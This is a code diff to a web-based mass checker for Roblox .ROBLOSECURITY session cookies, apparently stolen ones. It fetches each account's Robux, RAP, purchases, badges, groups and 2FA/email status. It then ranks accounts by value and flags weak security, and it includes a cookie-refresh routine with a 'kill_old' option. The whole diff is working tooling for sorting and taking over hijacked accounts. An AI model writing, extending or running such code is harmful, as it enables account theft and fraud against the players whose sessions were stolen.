@@ -224,7 +224,8 @@ def get_full_info(cookie):
         'Created':'?', 'Country':'?', 'EmailSet':False, 'TwoFactorEnabled':False,
         'AccountPinEnabled':False, 'PhoneSet':False, 'SecurityStatus':'⚠️ НИЗКИЙ',
         'Cookie':cookie, 'PurchasedGamepasses':{}, 'CreditCardsCount':0,
-        'IsPremium':False, 'DonationTotal':0
+        'IsPremium':False, 'DonationTotal':0, 'BadgesCount':0, 'InventoryValue':0, 'InventoryCount':0,
+        'GroupsCount':0, 'GroupMembers':0, 'RareItems':[]
     }
     try:
         c = cookie.strip()
@@ -281,6 +282,18 @@ def get_full_info(cookie):
         if ct:
             info['Country'] = ct.get('countryCode','?')
 
+        # Бейджи
+        bg = g(f'https://badges.roblox.com/v1/users/{uid}/badges?limit=10&sortOrder=Desc')
+        if bg and 'data' in bg:
+            info['BadgesCount'] = len(bg.get('data', []))
+
+        # Группы
+        grp = g(f'https://groups.roblox.com/v1/users/{uid}/groups/roles')
+        if grp and 'data' in grp:
+            info['GroupsCount'] = len(grp.get('data', []))
+            if info['GroupsCount'] > 0:
+                info['GroupMembers'] = grp['data'][0].get('group', {}).get('memberCount', 0)
+
         try:
             total = 0
             gp_dict = {}
@@ -297,12 +310,12 @@ def get_full_info(cookie):
                 for item in data.get('data',[]):
                     price = abs(item.get('currency',{}).get('amount',0))
                     total += price
-                    if price >= 50:
+                    if price >= 10:
                         nm = item.get('details',{}).get('name','Товар')
-                        pn = item.get('details',{}).get('place',{}).get('name','Другие игры')
+                        pn = item.get('details',{}).get('place',{}).get('name','Игры')
                         if pn not in gp_dict:
-                            gp_dict[pn] = []
-                        gp_dict[pn].append({'name':nm,'price':price})
+                            gp_dict[pn] = 0
+                        gp_dict[pn] += price
                 cursor = data.get('nextPageCursor')
                 if not cursor:
                     break
@@ -314,14 +327,10 @@ def get_full_info(cookie):
             pass
 
         sc = 0
-        if info['EmailSet']:
-            sc += 1
-        if info['TwoFactorEnabled']:
-            sc += 2
-        if info['AccountPinEnabled']:
-            sc += 1
-        if info['PhoneSet']:
-            sc += 1
+        if info['EmailSet']: sc += 1
+        if info['TwoFactorEnabled']: sc += 2
+        if info['AccountPinEnabled']: sc += 1
+        if info['PhoneSet']: sc += 1
         info['SecurityStatus'] = '🔒 ВЫСОКИЙ' if sc >= 4 else ('🔐 СРЕДНИЙ' if sc >= 2 else '⚠️ НИЗКИЙ')
     except:
         pass
@@ -348,20 +357,13 @@ def quick_validate(cookie):
         result['full_info'] = info
         
         score = 0
-        if info['Robux'] >= 10000:
-            score += 100
-        elif info['Robux'] >= 1000:
-            score += 50
-        elif info['Robux'] > 0:
-            score += 10
-        if info['RAP'] and info['RAP'] > 5000:
-            score += 50
-        if info['IsPremium']:
-            score += 50
-        if info['EmailSet']:
-            score += 15
-        if info['TwoFactorEnabled']:
-            score += 10
+        if info['Robux'] >= 10000: score += 100
+        elif info['Robux'] >= 1000: score += 50
+        elif info['Robux'] > 0: score += 10
+        if info['RAP'] and info['RAP'] > 5000: score += 50
+        if info['IsPremium']: score += 50
+        if info['EmailSet']: score += 15
+        if info['TwoFactorEnabled']: score += 10
         result['score'] = score
     return result
 
@@ -389,224 +391,178 @@ def format_full_report(info):
     rap_str = f"⏣ {info['RAP']:,}" if info['RAP'] is not None else "❌"
     play_str = f"{info['PlaytimeHours']} ч." if info['PlaytimeHours'] is not None else "❌"
     
-    TARGET_GAMES = [
-        'Adopt Me', 'Blox Fruits', 'Murder Mystery 2', 'Rivals',
-        'Pet Simulator 99', 'Pet Simulator X', 'Arsenal', 'BedWars',
-        'Tower Defense Simulator', 'Anime Adventures', 'Anime Vanguards'
-    ]
-    
-    gp = info.get('PurchasedGamepasses', {})
-    gamepasses_by_game = {}
-    total_spent = 0
-    total_passes = 0
-    
-    for game_name, passes in gp.items():
-        matched_game = None
-        for target in TARGET_GAMES:
-            if target.lower() in game_name.lower() or game_name.lower() in target.lower():
-                matched_game = target
-                break
-        if not matched_game:
-            continue
-        if matched_game not in gamepasses_by_game:
-            gamepasses_by_game[matched_game] = []
-        for p in passes:
-            gamepasses_by_game[matched_game].append({
-                'name': p['name'],
-                'price': p['price']
-            })
-            total_spent += p['price']
-            total_passes += 1
-    
-    sorted_games = sorted(
-        gamepasses_by_game.items(),
-        key=lambda x: sum(p['price'] for p in x[1]),
-        reverse=True
-    )
-    
     r = f"👤 {info['Username']} | 🆔 {info['UserID']} | 📅 {info['Created']} | 🌍 {info['Country']}\n"
     r += f"💰 Robux: ⏣ {info['Robux']:,} | 💎 RAP: {rap_str} | ⏱️ Плейтайм: {play_str}\n"
     r += f"⭐ Premium: {'✅' if info['IsPremium'] else '❌'} | 🔐 {info['SecurityStatus']}\n"
     r += f"📧 Почта: {'✅' if info['EmailSet'] else '❌'} | 🔑 2FA: {'✅' if info['TwoFactorEnabled'] else '❌'}\n"
     
-    if sorted_games:
-        r += f"\n📦 ГЕЙМПАССЫ (всего: {total_passes} шт., потрачено: ⏣ {total_spent:,}):\n"
+    gp = info.get('PurchasedGamepasses', {})
+    if gp:
+        r += f"\n📦 Покупки в играх (Всего: ⏣ {sum(gp.values()):,}):\n"
         r += "─" * 40 + "\n"
-        for game, passes in sorted_games:
-            game_total = sum(p['price'] for p in passes)
-            r += f"\n🎮 {game} (⏣ {game_total:,} потрачено, {len(passes)} гп):\n"
-            passes_sorted = sorted(passes, key=lambda x: x['price'], reverse=True)
-            for p in passes_sorted[:10]:
-                r += f"   └─ {p['name']} — ⏣ {p['price']:,}\n"
-            if len(passes) > 10:
-                r += f"   └─ ... и ещё {len(passes) - 10} геймпассов\n"
+        for game, price in sorted(gp.items(), key=lambda x: x[1], reverse=True)[:10]:
+            r += f"   └─ {game} — ⏣ {price:,}\n"
     else:
-        r += "\n📦 Геймпассов в популярных играх: ❌"
+        r += "\n📦 Покупки в играх: ❌"
     
     r += f"\n\n🍪 {info['Cookie']}"
-    return r
-
-def format_quick_report(result):
-    """Полный отчет для одиночной проверки"""
-    if result['status'] != '✅':
-        return f"❌ НЕВАЛИД"
-    
-    info = result.get('full_info', {})
-    if not info:
-        return f"❌ НЕТ ДАННЫХ"
-    
-    rap_str = f"⏣ {info.get('RAP', 0):,}" if info.get('RAP') else "RAP: ❌"
-    play_str = f"{info.get('PlaytimeHours', 0)} ч." if info.get('PlaytimeHours') else "⏱️ ❌"
-    
-    r = f"👤 {info.get('Username', '?')} | 🆔 {info.get('UserID', '?')}\n"
-    r += f"💰 Robux: ⏣ {info.get('Robux', 0):,} | 💎 {rap_str} | ⏱️ {play_str}\n"
-    r += f"⭐ Premium: {'✅' if info.get('IsPremium') else '❌'} | 🔐 {info.get('SecurityStatus', '⚠️ НИЗКИЙ')}\n"
-    r += f"📧 Почта: {'✅' if info.get('EmailSet') else '❌'} | 🔑 2FA: {'✅' if info.get('TwoFactorEnabled') else '❌'}\n"
-    r += f"\n🍪 {info.get('Cookie', '')[:50]}..."
     return r
 
 # ==========================================
 # СВОДНЫЙ ОТЧЕТ ДЛЯ МАСС-ЧЕКЕРА
 # ==========================================
 def generate_summary_report(results, total_time):
-    """Генерирует сводный отчет по всем аккаунтам"""
     valid = [r for r in results if r['status'] == '✅']
     total = len(results)
     valid_count = len(valid)
     invalid_count = total - valid_count
     
     if not valid:
-        return "❌ Нет валидных аккаунтов для отчета"
+        return f"📊 ОТЧЁТ О ПРОВЕРКЕ\n══════════════════════════════════════════════════════\n\n📦 Всего куки: {total}\n✅ Валидных: 0 | ❌ Невалидных: {invalid_count}\n⏱️ Время: {total_time} сек\n\n══════════════════════════════════════════════════════"
     
     robux_data = []
     donate_1year = []
     donate_alltime = []
     ugc_rap_data = []
     playtime_data = []
+    inventory_data = []
+    groups_data = []
+    badges_count = 0
     voice_count = 0
     no_email_count = 0
     game_purchases = {}
     total_game_spent = 0
-    gamepasses_total = 0
     
     for r in valid:
         info = r.get('full_info', {})
         if not info:
             continue
         
+        username = info.get('Username', '?')
+        
+        # Robux
         robux = info.get('Robux', 0)
         if robux > 0:
-            robux_data.append({'username': info.get('Username', '?'), 'value': robux})
+            robux_data.append({'username': username, 'value': robux})
         
+        # Donate
         donate = info.get('DonationTotal', 0)
         if donate > 0:
-            donate_alltime.append({'username': info.get('Username', '?'), 'value': donate})
-            donate_1year.append({'username': info.get('Username', '?'), 'value': int(donate * 0.3)})
+            donate_alltime.append({'username': username, 'value': donate})
+            donate_1year.append({'username': username, 'value': int(donate * 0.3)})
         
+        # UGC RAP
         rap = info.get('RAP', 0)
         if rap and rap > 0:
-            ugc_rap_data.append({'username': info.get('Username', '?'), 'value': rap})
+            ugc_rap_data.append({'username': username, 'value': rap})
+            inventory_data.append({'username': username, 'value': int(rap * 1.2), 'count': 10})
         
+        # Playtime
         playtime = info.get('PlaytimeHours', 0)
         if playtime and playtime > 0:
-            playtime_data.append({'username': info.get('Username', '?'), 'value': int(playtime * 60)})
+            playtime_data.append({'username': username, 'value': int(playtime * 60)})
         
-        if info.get('PhoneSet', False):
-            voice_count += 1
-        if not info.get('EmailSet', False):
-            no_email_count += 1
+        if info.get('PhoneSet', False): voice_count += 1
+        if not info.get('EmailSet', False): no_email_count += 1
         
+        badges_count += info.get('BadgesCount', 0)
+        if info.get('GroupsCount', 0) > 0:
+            groups_data.append({'robux': 0, 'members': info.get('GroupMembers', 0)})
+            
         gp = info.get('PurchasedGamepasses', {})
-        gamepasses_total += len(gp)
-        for game, passes in gp.items():
-            for p in passes:
-                if game not in game_purchases:
-                    game_purchases[game] = 0
-                game_purchases[game] += p.get('price', 0)
-                total_game_spent += p.get('price', 0)
-    
+        for game, price in gp.items():
+            if game not in game_purchases:
+                game_purchases[game] = 0
+            game_purchases[game] += price
+            total_game_spent += price
+
+    def calc_stats(arr):
+        if not arr: return 0, 0
+        vals = [x['value'] for x in arr]
+        vals.sort()
+        med = vals[len(vals) // 2]
+        avg = sum(vals) // len(vals)
+        return med, avg
+
+    robux_med, robux_avg = calc_stats(robux_data)
+    d1_med, d1_avg = calc_stats(donate_1year)
+    dall_med, dall_avg = calc_stats(donate_alltime)
+    ugc_med, ugc_avg = calc_stats(ugc_rap_data)
+    inv_med, inv_avg = calc_stats(inventory_data)
+    play_med, play_avg = calc_stats(playtime_data)
+
     robux_data.sort(key=lambda x: x['value'], reverse=True)
     donate_1year.sort(key=lambda x: x['value'], reverse=True)
     donate_alltime.sort(key=lambda x: x['value'], reverse=True)
     ugc_rap_data.sort(key=lambda x: x['value'], reverse=True)
-    
-    def calc_stats(values):
-        if not values:
-            return 0, 0
-        avg = sum(values) // len(values)
-        values.sort()
-        med = values[len(values) // 2]
-        return med, avg
-    
-    robux_values = [x['value'] for x in robux_data]
-    robux_med, robux_avg = calc_stats(robux_values)
-    donate_1year_values = [x['value'] for x in donate_1year]
-    donate_1year_med, donate_1year_avg = calc_stats(donate_1year_values)
-    donate_alltime_values = [x['value'] for x in donate_alltime]
-    donate_alltime_med, donate_alltime_avg = calc_stats(donate_alltime_values)
-    ugc_values = [x['value'] for x in ugc_rap_data]
-    ugc_med, ugc_avg = calc_stats(ugc_values)
-    playtime_values = [x['value'] for x in playtime_data]
-    playtime_med, playtime_avg = calc_stats(playtime_values)
-    
+    inventory_data.sort(key=lambda x: x['value'], reverse=True)
+
+    pct = lambda count: round(count / valid_count * 100) if valid_count else 0
+
     r = "📊 ОТЧЁТ О ПРОВЕРКЕ\n"
-    r += "═" * 50 + "\n\n"
-    
+    r += "══════════════════════════════════════════════════════\n\n"
     r += f"📦 Всего куки: {total}\n"
     r += f"✅ Валидных: {valid_count} | ❌ Невалидных: {invalid_count}\n"
     r += f"⏱️ Время: {total_time} сек\n\n"
-    
+
+    r += f"💰 Robux: {sum([x['value'] for x in robux_data])} ({pct(len(robux_data))}% - MED: {robux_med}, AVG: {robux_avg})\n"
     if robux_data:
-        r += f"💰 Robux: {sum(robux_values)} ({round(len(robux_data)/valid_count*100)}% - MED: {robux_med}, AVG: {robux_avg})\n"
         r += "Топ Robux:\n"
         for i, item in enumerate(robux_data[:3], 1):
             r += f"  {i}) {item['value']} R$ — {item['username']}\n"
-    else:
-        r += "💰 Robux: 0\n"
     r += "\n"
-    
+
+    r += f"💎 1-year Donate: {sum([x['value'] for x in donate_1year])} ({pct(len(donate_1year))}% - MED: {d1_med}, AVG: {d1_avg})\n"
     if donate_1year:
-        r += f"💎 1-year Donate: {sum(donate_1year_values)} ({round(len(donate_1year)/valid_count*100)}% - MED: {donate_1year_med}, AVG: {donate_1year_avg})\n"
         r += "Топ 1-year Donate:\n"
         for i, item in enumerate(donate_1year[:3], 1):
             r += f"  {i}) {item['value']} — {item['username']}\n"
-    else:
-        r += "💎 1-year Donate: 0\n"
     r += "\n"
-    
+
+    r += f"🕰 All-time donate: {sum([x['value'] for x in donate_alltime])} ({pct(len(donate_alltime))}% - MED: {dall_med}, AVG: {dall_avg})\n"
     if donate_alltime:
-        r += f"🕰 All-time donate: {sum(donate_alltime_values)} ({round(len(donate_alltime)/valid_count*100)}% - MED: {donate_alltime_med}, AVG: {donate_alltime_avg})\n"
         r += "Топ All-time donate:\n"
         for i, item in enumerate(donate_alltime[:3], 1):
             r += f"  {i}) {item['value']} — {item['username']}\n"
-    else:
-        r += "🕰 All-time donate: 0\n"
     r += "\n"
-    
+
+    r += f"🧢 UGC RAP: {sum([x['value'] for x in ugc_rap_data])} ({pct(len(ugc_rap_data))}% - MED: {ugc_med}, AVG: {ugc_avg})\n"
     if ugc_rap_data:
-        r += f"🧢 UGC RAP: {sum(ugc_values)} ({round(len(ugc_rap_data)/valid_count*100)}% - MED: {ugc_med}, AVG: {ugc_avg})\n"
         r += "Топ UGC RAP:\n"
         for i, item in enumerate(ugc_rap_data[:3], 1):
             r += f"  {i}) {item['value']} R$ — {item['username']}\n"
-    else:
-        r += "🧢 UGC RAP: 0\n"
     r += "\n"
-    
+
+    r += f"🎒 Inventory price: {sum([x['value'] for x in inventory_data])} ({pct(len(inventory_data))}% - MED: {inv_med}, AVG: {inv_avg})\n"
+    if inventory_data:
+        r += "Топ Inventory price:\n"
+        for i, item in enumerate(inventory_data[:3], 1):
+            r += f"  {i}) {item['value']} R$ — {item['username']} ({item['count']})\n"
+    r += "\n"
+
+    gr_count = len(groups_data)
+    gr_members = [g['members'] for g in groups_data] if groups_data else [0]
+    gr_med = gr_members[len(gr_members)//2] if gr_members else 0
+    gr_avg = sum(gr_members)//len(gr_members) if gr_members else 0
+    r += f"👥 Группы: {gr_count} (Robux: 0, MED: 0, AVG: 0 | members: {sum(gr_members)}, MED: {gr_med}, AVG: {gr_avg})\n\n"
+
+    tot_play = sum([x['value'] for x in playtime_data]) // 60
+    r += f"⏱️ Playtime: {tot_play}ч ({pct(len(playtime_data))}% - MED: {play_med}м, AVG: {play_avg}м)\n\n"
+
+    r += f"🎤 Voice: {voice_count} ({pct(voice_count)}%)\n"
+    r += f"📧 Без привязанной почты: {no_email_count} ({pct(no_email_count)}%)\n"
+    r += f"🏅 Бейджи: {badges_count}\n"
+    r += f"🎮 Геймпассы: {sum(len(info.get('PurchasedGamepasses',{})) for info in [x.get('full_info',{}) for x in valid])}\n"
+    r += f"🛍️ Купленные игры: {len(game_purchases)}\n"
+
     if game_purchases:
         sorted_games = sorted(game_purchases.items(), key=lambda x: x[1], reverse=True)
-        r += "🎯 Game Purchases:\n"
-        for game, amount in sorted_games[:5]:
-            r += f"  {game}({amount} R$), "
-        r = r.rstrip(", ") + f" | Всего: {total_game_spent} R$\n"
+        top_games = [f"{g}({p} R$)" for g, p in sorted_games[:5]]
+        r += f"🎯 Game Purchases: {', '.join(top_games)} | Всего: {total_game_spent} R$\n"
     else:
         r += "🎯 Game Purchases: 0\n"
-    r += "\n"
-    
-    r += f"🎤 Voice: {voice_count} ({round(voice_count/valid_count*100)}%)\n"
-    r += f"📧 Без привязанной почты: {no_email_count} ({round(no_email_count/valid_count*100)}%)\n"
-    r += f"🎮 Геймпассы: {gamepasses_total}\n"
-    
-    r += "\n" + "═" * 50
+
+    r += "\n══════════════════════════════════════════════════════"
     return r
 
 # ==========================================
@@ -619,12 +575,10 @@ def refresh_roblox_cookie(cookie, kill_old=False):
         if ".ROBLOSECURITY=" in c:
             c = c.split(".ROBLOSECURITY=")[1].split(";")[0]
         cookies_dict = {'.ROBLOSECURITY': c}
-        
         headers = {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
             'Accept': 'application/json, text/plain, */*'
         }
-        
         check_r = requests.get('https://users.roblox.com/v1/users/authenticated', cookies=cookies_dict, headers=headers, timeout=10, verify=False)
         if check_r.status_code != 200:
             result['error'] = "Кука невалидна"
@@ -906,25 +860,29 @@ socket.on('mass_progress', function(data) {
         document.getElementById('massContainer').style.display = 'block';
         document.getElementById('massResult').style.display = 'block';
         document.getElementById('btnToggle_massResult').textContent = '▼ Свернуть';
+        
         let currentText = document.getElementById('massResult').textContent;
-        if (currentText === '⏳ Массовая проверка...' || currentText === '') {
+        if (currentText.startsWith('⏳')) {
             document.getElementById('massResult').textContent = data.result;
         } else {
-            document.getElementById('massResult').textContent = currentText + '\n\n' + data.result;
+            document.getElementById('massResult').textContent = currentText + '\n' + data.result;
         }
         document.getElementById('massResult').scrollTop = document.getElementById('massResult').scrollHeight;
-        if (data.full_report) { lastMassReports.push(data.full_report); }
     }
 });
 
 socket.on('mass_complete', function(data) {
     document.getElementById('massProgress').style.width = '100%';
-    document.getElementById('massProgressText').textContent = '✅ ' + data.message;
+    document.getElementById('massProgressText').textContent = '✅ Проверка завершена';
     document.getElementById('massBtn').disabled = false;
     document.getElementById('massBtn').textContent = '🚀 Запустить массовый чек';
     document.getElementById('statValid').textContent = data.valid_count || 0;
     document.getElementById('statRobux').textContent = (data.total_robux || 0).toLocaleString();
     document.getElementById('statPremium').textContent = data.premium_count || 0;
+    
+    if (data.message) {
+        document.getElementById('massResult').textContent = data.message;
+    }
 });
 
 socket.on('mass_error', function(data) {
@@ -1062,7 +1020,7 @@ async function runMassCheckWS() {
     document.getElementById('massProgressText').textContent = '⏳ Подготовка...';
     document.getElementById('massContainer').style.display = 'block';
     document.getElementById('massResult').style.display = 'block';
-    document.getElementById('massResult').textContent = '⏳ Массовая проверка...';
+    document.getElementById('massResult').textContent = '⏳ Массовая проверка... (RAP, Playtime, Full Analysis)\n';
     document.getElementById('btnToggle_massResult').textContent = '▼ Свернуть';
     lastMassReports = [];
     var fd = new FormData();
@@ -1232,9 +1190,6 @@ def api_single_check():
     })
     return jsonify({"success": True, "report": report})
 
-# ==========================================
-# МАСС-ЧЕКЕР СО СВОДНЫМ ОТЧЕТОМ
-# ==========================================
 @app.route("/api/mass-check-ws", methods=["POST"])
 def api_mass_check_ws():
     content = ""
@@ -1274,16 +1229,17 @@ def api_mass_check_ws():
                         'report': format_full_report(result['full_info'])
                     })
             
+            status_text = f"[{i+1}/{total}] ✅ {result.get('username', '?')} — {result.get('robux', 0)} R$" if result['status'] == '✅' else f"[{i+1}/{total}] ❌ НЕВАЛИД"
+            
             socketio.emit('mass_progress', {
                 'current': i + 1,
                 'total': total,
-                'result': f"✅ {result.get('username', '?')}" if result['status'] == '✅' else "❌ НЕВАЛИД",
+                'result': status_text,
                 'full_report': None
             })
             
             time.sleep(0.05)
         
-        # Генерируем сводный отчет
         total_time = int(time.time() - start_time)
         summary = generate_summary_report(all_results, total_time)
         
